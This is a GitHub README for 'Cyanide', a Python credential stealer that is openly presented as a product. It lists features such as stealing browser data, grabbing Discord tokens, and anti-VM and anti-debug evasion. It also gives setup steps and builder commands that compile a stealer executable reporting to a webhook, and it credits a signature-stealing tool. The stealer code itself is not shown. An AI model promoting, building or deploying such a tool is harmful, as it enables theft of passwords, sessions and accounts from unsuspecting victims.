<div align="center">
  <h1>Cyanide</h1>
  <img src=https://cdn.discordapp.com/attachments/1045456439965126717/1084943239565553865/Cyanide.png width=400px>
</div>

# Table of contents

- [Features](#features)

- [Installation](#installation)

- [Usage](#usage)

- [Showcase](#showcase)

- [License](#license)

- [Contributors](#contributors)

## Features

- Browser stealing

- Discord token grabbing

- AntiVM

- AntiDebug

## Installation

To install **Cyanide** you must first have **Python** installed and its packet manager **PIP**.

[Python 3.10.11](https://www.python.org/downloads/release/python-31011/)
[Python for linux](https://docs.python.org/3/using/unix.html)

Now you can proceed to cloning the repository

1. Download the repository zip: [**Release**](https://github.com/Decks-Team/Cyanide-Stealer/releases)

2. Configure the enviroment
```cmd
pip install -r requirements.txt
```

## Usage

```
Usage: builder.py [OPTIONS] WEBHOOK

Options:
  -o, --output TEXT  Output file  [required]
  --debugging
  --help             Show this message and exit.
```

The stealer executable file occurs from a **builder program** to use it you can use the following commands:

Classic mode:
```cmd
python builder.py mywebhook -o thisismyfile
```

Debugging mode allows you to view errors without the terminal shutting down

Debugging mode:
```cmd
python builder.py mywebhook -o thisismyfile --debugging
```

## Showcase

<img src=https://user-images.githubusercontent.com/76649588/235801807-8ec5c4fe-7b43-4ed6-9454-a67b03946d6c.png width="600px">
<img src=https://user-images.githubusercontent.com/76649588/235801823-7bf0ec72-3436-40c2-b1b3-ed15e10654cb.png width="600px">


## Contributors

<a href="https://github.com/Decks-Team/Cyanide-Stealer/graphs/contributors">
  <img src="https://contributors-img.web.app/image?repo=Decks-Team/Cyanide-Stealer"/>
</a>

## License

This application is distributed under the ***[MIT](https://en.wikipedia.org/wiki/MIT_License) license*** you can ***consult the file***: ***[LICENSE.txt](LICENSE.txt)***

## Used tools

- [SigThief](https://github.com/secretsquirrel/SigThief)
